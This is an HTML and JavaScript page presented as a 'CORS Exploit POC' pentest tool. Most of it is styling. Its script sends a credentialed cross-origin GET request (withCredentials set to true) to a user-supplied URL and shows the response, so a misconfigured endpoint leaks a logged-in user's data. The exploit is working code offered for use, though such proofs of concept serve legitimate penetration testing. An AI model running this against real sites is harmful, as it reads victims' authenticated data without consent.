<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>CORS Exploit POC | Pentest Tool</title>
  <!-- Inline favicon (SVG data URI for the CORS icon) -->
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%232c313a' stroke='%2361afef' stroke-width='6'/%3E%3Cpath d='M30 50 L70 50 M50 30 L50 70' stroke='%2361afef' stroke-width='8' stroke-linecap='round' opacity='0.9'/%3E%3Ccircle cx='50' cy='50' r='12' fill='%2398c379'/%3E%3C/svg%3E" type="image/svg+xml">
  <style>
    /* ----- Refined, natural dark theme with subtle glassmorphism ----- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      background: radial-gradient(circle at 20% 30%, #2c313a, #1e2229);
      color: #cdd6e9;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      margin: 0;
      line-height: 1.5;
    }

    /* main card – soft depth */
    .container {
      background: rgba(45, 51, 63, 0.8);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
      background: linear-gradient(145deg, rgba(54, 61, 73, 0.85) 0%, rgba(35, 39, 47, 0.9) 100%);
      border: 1px solid rgba(97, 175, 239, 0.2);
      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.65), 0 0 0 1px rgba(255, 255, 255, 0.04) inset;
      border-radius: 2.5rem;
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 720px;
      display: flex;
      flex-direction: column;
      align-items: center;
      transition: all 0.2s ease;
      margin-bottom: 1.2rem;
    }

    h2 {
      font-weight: 600;
      font-size: 2rem;
      letter-spacing: -0.3px;
      color: #e2e9f5;
      position: relative;
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      margin-bottom: 1.8rem;
      text-shadow: 0 2px 5px rgba(0,0,0,0.4);
    }

    /* subtle animated glow behind heading */
    h2::after {
      content: "";
      position: absolute;
      inset: -8px -18px;
      background: radial-gradient(ellipse at center, rgba(97, 175, 239, 0.25) 0%, transparent 70%);
      filter: blur(14px);
      z-index: -1;
      border-radius: 60px;
      opacity: 0.7;
    }

    hr {
      border: 0;
      height: 1px;
      width: 100%;
      background: linear-gradient(90deg, transparent, #61afef70, #61afef, #61afef70, transparent);
      margin: 5px 0 1.8rem 0;
    }

    .input-container {
      display: flex;
      flex-wrap: wrap;
      gap: 0.8rem;
      width: 100%;
      margin-bottom: 2rem;
      align-items: center;
    }

    input[type="text"] {
      flex: 1 1 280px;
      padding: 0.9rem 1.2rem;
      background: rgba(18, 22, 28, 0.8);
      border: 1px solid rgba(97, 175, 239, 0.25);
      border-radius: 3rem;
      font-size: 0.95rem;
      color: #eef2f9;
      outline: none;
      backdrop-filter: blur(6px);
      transition: all 0.25s ease;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      letter-spacing: 0.2px;
    }

    input[type="text"]::placeholder {
      color: #8b95a5;
      font-weight: 400;
      font-size: 0.9rem;
    }

    input[type="text"]:focus {
      border-color: #98c379;
      box-shadow: 0 0 0 3px rgba(152, 195, 121, 0.45), 0 6px 14px rgba(0,0,0,0.5);
      background: rgba(22, 26, 32, 0.9);
    }

    button {
      background: #98c379;
      border: none;
      padding: 0.9rem 2rem;
      border-radius: 3rem;
      font-weight: 650;
      font-size: 0.95rem;
      color: #1b1f26;
      background: linear-gradient(135deg, #a7d489, #87b868);
      box-shadow: 0 8px 18px rgba(152, 195, 121, 0.35);
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.3rem;
      letter-spacing: 0.3px;
      transition: all 0.2s ease;
      border: 1px solid rgba(255, 255, 255, 0.15);
      white-space: nowrap;
    }

    button:hover {
      background: linear-gradient(135deg, #b3e096, #93c46e);
      box-shadow: 0 10px 22px rgba(152, 195, 121, 0.55);
      transform: translateY(-1px);
      color: #0f1218;
    }

    button:active {
      transform: translateY(1px);
      box-shadow: 0 5px 12px rgba(152, 195, 121, 0.5);
    }

    textarea {
      width: 100%;
      padding: 1.2rem 1.2rem;
      background: rgba(12, 15, 20, 0.8);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(97, 175, 239, 0.3);
      border-radius: 1.8rem;
      font-size: 0.9rem;
      color: #d6dde8;
      line-height: 1.6;
      resize: vertical;
      min-height: 160px;
      font-family: 'JetBrains Mono', 'Fira Code', monospace;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s;
      box-shadow: inset 0 5px 12px rgba(0,0,0,0.5);
    }

    textarea::placeholder {
      color: #6f7a8c;
      font-family: 'Inter', sans-serif;
      font-size: 0.9rem;
    }

    textarea:focus {
      border-color: #61afef;
      box-shadow: 0 0 0 3px rgba(97, 175, 239, 0.5), inset 0 4px 12px rgba(0,0,0,0.6);
    }

    /* footer elegant */
    footer {
      width: 100%;
      text-align: center;
      font-size: 0.85rem;
      color: #7f8b9f;
      padding: 0.5rem 1rem;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-wrap: wrap;
      gap: 0.3rem;
      margin-top: 0.2rem;
    }

    footer a {
      color: #98c379;
      text-decoration: none;
      font-weight: 550;
      border-bottom: 1px dotted rgba(152, 195, 121, 0.5);
      transition: color 0.2s, border-color 0.2s;
    }

    footer a:hover {
      color: #b8e39a;
      border-bottom: 1px solid #b8e39a;
    }

    /* custom popup (toast-like) instead of alert */
    .popup-toast {
      position: fixed;
      bottom: 2.2rem;
      left: 50%;
      transform: translateX(-50%) scale(0.9);
      background: rgba(20, 24, 31, 0.95);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(97, 175, 239, 0.5);
      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.7), 0 0 25px rgba(97, 175, 239, 0.3);
      color: #f0f4fc;
      padding: 0.9rem 2.2rem;
      border-radius: 4rem;
      font-weight: 500;
      font-size: 0.95rem;
      display: flex;
      align-items: center;
      gap: 0.6rem;
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, transform 0.25s ease, visibility 0.3s;
      white-space: nowrap;
      max-width: 90vw;
      text-align: center;
    }

    .popup-toast.show {
      opacity: 1;
      visibility: visible;
      transform: translateX(-50%) scale(1);
    }

    .popup-toast.warning {
      border-color: #e5c07b;
      box-shadow: 0 20px 30px rgba(229, 192, 123, 0.25);
    }

    .popup-toast.error {
      border-color: #e06c75;
      box-shadow: 0 20px 30px rgba(224, 108, 117, 0.3);
    }

    @media (max-width: 500px) {
      .container {
        padding: 2rem 1.2rem;
      }
      .input-container {
        flex-direction: column;
        align-items: stretch;
      }
      button {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>⚡ CORS Exploit POC</h2>
    <hr>
    <div class="input-container">
      <input type="text" id="targetURL" placeholder="https://vulnerable-api.example.com/user" autocomplete="off" spellcheck="false" />
      <button id="exploitBtn">↗ Exploit</button>
    </div>
    <textarea id="fetchedResource" placeholder="Response will appear here... (sensitive data may leak)" readonly></textarea>
  </div>

  <footer>
    <p>🔐 Created by <a href="https://github.com/Milan-Gautam" target="_blank" rel="noopener noreferrer">Milan</a> · Pentest tool</p>
  </footer>

  <!-- Custom popup container -->
  <div id="liveToast" class="popup-toast"></div>

  <script>
    (function() {
      'use strict';

      // DOM elements
      const targetURLInput = document.getElementById('targetURL');
      const exploitButton = document.getElementById('exploitBtn');
      const fetchedResourceTextarea = document.getElementById('fetchedResource');
      const toast = document.getElementById('liveToast');

      // Toast utility (replaces alert)
      function showToast(message, type = 'info') {
        if (!toast) return;
        
        // Reset any existing timeout
        if (window.toastTimer) clearTimeout(window.toastTimer);
        
        // Remove previous type classes
        toast.classList.remove('warning', 'error', 'show');
        
        // Set message
        toast.textContent = message;
        
        // Apply type styling
        if (type === 'warning') {
          toast.classList.add('warning');
        } else if (type === 'error') {
          toast.classList.add('error');
        }
        
        // Force reflow for animation
        void toast.offsetWidth;
        toast.classList.add('show');
        
        // Auto hide after 3.5 seconds
        window.toastTimer = setTimeout(() => {
          toast.classList.remove('show');
        }, 3500);
      }

      // Core CORS exploit function
      function exploitCORS() {
        const targetUrl = targetURLInput.value.trim();
        
        // Validation with popup instead of alert
        if (!targetUrl) {
          showToast('⚠️ Please enter a valid target URL', 'warning');
          targetURLInput.focus();
          return;
        }

        // Simple URL sanity check (must start with http:// or https://)
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
          showToast('🔗 URL must start with http:// or https://', 'warning');
          return;
        }

        // Clear previous response and show loading state
        fetchedResourceTextarea.value = '';
        fetchedResourceTextarea.placeholder = 'Fetching resource...';
        
        // Disable button temporarily to prevent spam
        exploitButton.disabled = true;
        exploitButton.textContent = '⏳ Sending...';

        try {
          const req = new XMLHttpRequest();
          
          req.onload = function() {
            // Re-enable button
            exploitButton.disabled = false;
            exploitButton.textContent = '↗ Exploit';
            
            // Display response
            fetchedResourceTextarea.value = this.responseText || '';
            
            if (!this.responseText || this.responseText.trim() === '') {
              fetchedResourceTextarea.placeholder = 'No content received. Check console or target CORS headers.';
              showToast('📭 Empty response – target might not be vulnerable or returned no data', 'warning');
            } else {
              fetchedResourceTextarea.placeholder = 'Response loaded. Check for sensitive data.';
              showToast('✅ Resource fetched! Check the text area below.', 'info');
            }
            
            // Additional hint: if status is 0, likely blocked by browser (CORS error)
            if (this.status === 0 && this.responseText === '') {
              showToast('🚫 Request blocked (CORS or network error). Check browser console.', 'error');
            }
          };

          req.onerror = function() {
            exploitButton.disabled = false;
            exploitButton.textContent = '↗ Exploit';
            fetchedResourceTextarea.value = '';
            fetchedResourceTextarea.placeholder = 'Network error or CORS denied.';
            showToast('❌ Network error – CORS likely prevents reading response.', 'error');
          };

          req.ontimeout = function() {
            exploitButton.disabled = false;
            exploitButton.textContent = '↗ Exploit';
            fetchedResourceTextarea.value = '';
            fetchedResourceTextarea.placeholder = 'Request timed out.';
            showToast('⏰ Request timed out.', 'error');
          };

          // Open GET request with credentials (cookies, HTTP auth)
          req.open('GET', targetUrl, true);
          req.withCredentials = true;
          req.timeout = 12000; // 12 seconds timeout
          
          // Send request
          req.send();
          
        } catch (error) {
          exploitButton.disabled = false;
          exploitButton.textContent = '↗ Exploit';
          fetchedResourceTextarea.value = '';
          fetchedResourceTextarea.placeholder = 'Exception occurred.';
          console.error('CORS exploit error:', error);
          showToast('⚠️ Unexpected error: ' + error.message, 'error');
        }
      }

      // Attach event listener to button
      exploitButton.addEventListener('click', exploitCORS);

      // Allow pressing Enter in input field to trigger exploit
      targetURLInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          e.preventDefault();
          exploitCORS();
        }
      });

      // Clean placeholder reset when input changes
      targetURLInput.addEventListener('input', function() {
        // Keep placeholder as is; but if textarea was empty we keep default placeholder
      });

      // Optional: close toast on click (user friendly)
      toast.addEventListener('click', function() {
        toast.classList.remove('show');
        if (window.toastTimer) clearTimeout(window.toastTimer);
      });

      // Initial placeholder hint
      fetchedResourceTextarea.placeholder = 'Click Exploit to fetch resource from vulnerable endpoint';
      
    })();
  </script>
</body>
</html>
